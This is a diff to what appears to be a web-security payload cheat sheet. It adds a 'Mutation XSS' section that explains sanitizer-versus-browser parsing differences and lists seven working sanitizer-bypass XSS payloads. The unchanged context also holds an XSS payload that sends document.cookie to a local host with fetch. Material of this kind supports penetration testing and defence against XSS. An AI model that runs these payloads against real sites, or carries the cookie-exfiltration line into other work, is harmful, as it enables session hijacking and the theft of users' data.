@@ -116,6 +116,7 @@
       <li><a href="#tab-nabbing">Tab Nabbing</a></li>
       <li><a href="#file-upload">File Upload</a></li>
       <li><a href="#xss-image-upload">XSS Image Upload</a></li>
+      <li><a href="#mxss">Mutation XSS</a></li>
       <li><a href="#host-header-injection">Host Header Injection</a></li>
       <li><a href="#file-path-traversal">File path traversal</a></li>
       <li><a href="#sql-injection">SQL injection</a></li>
@@ -2079,6 +2080,24 @@ alert?.(1337,)?.()
 ```javascript' id=x tabindex=1 onfocus=fetch('//127.0.0.1:1337/?cookie='+document.cookie) autofocus x='
 test
 ```
+</code></pre></div></div>
+<hr>
+
+<h3 id="mxss">Mutation XSS</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Mutation XSS always relies on differences (context/bug) between the sanitizer's parser and the browser's.
+# The sanitizer often takes these steps:
+1. Parse the input as HTML
+2. Traverse the DOM tree and remove any unsafe elements/attributes you encounter
+3. Serialize the tree back into an HTML String
+
+# Payloads:
+&lt;title>&lt;p id="&lt;/title>&lt;img src onerror=alert()>">&lt;/title>
+&lt;noscript>&lt;p id="&lt;/noscript>&lt;img src onerror=alert()>">
+{{&lt;p id="}}&lt;img src onerror=alert()>">
+&lt;math>&lt;style>&lt;!--&lt;/style>&lt;img src onerror=alert()>--&gt;
+&lt;svg>&lt;style>/*&lt;img src onerror=alert(origin)>*/
+&lt;math>&lt;style>/*&lt;img src onerror=alert(origin)>*/
+&lt;form>&lt;math>&lt;mtext>&lt;/form>&lt;form>&lt;mglyph>&lt;svg>&lt;mtext>&lt;title>&lt;path is="&lt;/title>&lt;img src onerror=alert(origin)>">
 </code></pre></div></div>
 <hr>
 
